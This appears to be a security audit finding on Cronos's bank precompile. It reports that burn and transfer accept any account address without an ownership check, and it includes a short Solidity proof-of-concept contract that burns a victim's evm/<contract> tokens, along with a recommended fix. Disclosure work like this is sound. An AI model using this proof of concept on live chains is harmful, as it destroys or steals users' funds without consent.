### Title
Unauthorized Burn of Any Account's `evm/<contract>` Native Tokens via Bank Precompile — (`x/cronos/keeper/precompiles/bank.go`)

### Summary

The `burn` handler in the bank precompile derives the denom from `contract.Caller()` but burns from the **first ABI argument** (`args[0]`), which is fully attacker-controlled. There is no check that the address being burned from equals the calling contract or has authorized the burn. Any contract can therefore burn `evm/<itself>` native tokens from any account that holds them.

---

### Finding Description

In `Run()`, the shared `MintMethodName`/`BurnMethodName` branch:

```go
recipient := args[0].(common.Address)   // ← attacker supplies any address
amount    := args[1].(*big.Int)
addr      := sdk.AccAddress(recipient.Bytes())
// only blocked-address check, no ownership/authorization check
denom := EVMDenom(contract.Caller())    // "evm/<caller_contract>"
...
// BURN PATH
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
``` [1](#0-0) 

The denom is scoped to the caller contract (`evm/<caller>`), so the burn only touches tokens of that denom. However, the account whose tokens are destroyed (`addr`) is taken verbatim from the call argument — there is **no invariant** enforcing `addr == contract.Caller()` or any approval mechanism.

The `checkBlockedAddr` guard only prevents module accounts from being targeted; it does not protect ordinary user accounts. [2](#0-1) 

The same structural flaw exists in the `transfer` branch, where `sender` (line 175) is also caller-supplied with no ownership check, enabling theft rather than destruction. [3](#0-2) 

---

### Impact Explanation

A user who holds `evm/<contract>` native tokens (e.g., after calling `moveToNative` on a CRC20 wrapper) can have those tokens destroyed without consent by the contract that issued them. The `evm/<contract>` denom is a real Cosmos bank-module balance; its destruction is permanent and irreversible. This satisfies the Critical criterion: **unauthorized burn causing direct loss of user funds**.

---

### Likelihood Explanation

The attacker must:
1. Deploy (or control) a contract that calls `bank.burn(victimAddress, amount)`.
2. Have the victim hold `evm/<attacker_contract>` tokens — achievable by minting to them via the same contract's `mint` path, or by any flow that results in the victim holding those native tokens.

No privileged keys, validator compromise, or broken cryptography are required. The same-block reorder scenario (victim's `moveToNative` tx followed by attacker's `burn` tx in the same block) is one concrete trigger, but the vulnerability is reachable at any time after the victim acquires the tokens.

---

### Recommendation

Enforce that the address being burned from is the calling contract itself:

```go
// In the burn branch, before executing:
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn from caller's own account")
}
```

Alternatively, implement an ERC-20-style allowance/approval mechanism so that a contract may only burn from a third-party address if that address has explicitly approved it.

The same fix must be applied to the `transfer` branch, where `sender` must equal `contract.Caller()` or be covered by an allowance.

---

### Proof of Concept

```solidity
// Attacker's malicious contract
contract Attacker {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint native tokens to victim (victim calls this, or attacker mints directly)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
        // victim now holds `evm/<this>` native tokens
    }

    // Step 2: burn victim's native tokens without their consent
    function drainVictim(address victim, uint256 amount) external {
        bank.burn(victim, amount);
        // victim's `evm/<this>` balance is now zero; funds permanently destroyed
    }
}
```

Execution:
1. Deploy `Attacker` at address `A`.
2. Call `seedVictim(victimAddr, 1000)` — victim now holds 1000 `evm/A` native tokens.
3. Call `drainVictim(victimAddr, 1000)` — victim's balance is burned to zero with no authorization from victim.

The `SendCoinsFromAccountToModule` call at line 144 succeeds because the bank module does not require the account holder's signature — it trusts the precompile caller. The precompile caller (the `Attacker` contract) is the denom issuer, but it is not the token holder, and no check enforces that distinction. [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L92-101)
```go
func (bc *BankContract) checkBlockedAddr(addr sdk.AccAddress) error {
	to, err := sdk.AccAddressFromBech32(addr.String())
	if err != nil {
		return err
	}
	if bc.bankKeeper.BlockedAddr(to) {
		return errorsmod.Wrapf(errortypes.ErrUnauthorized, "%s is not allowed to receive funds", to.String())
	}
	return nil
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L121-149)
```go
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
```

**File:** x/cronos/keeper/precompiles/bank.go (L175-192)
```go
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
```
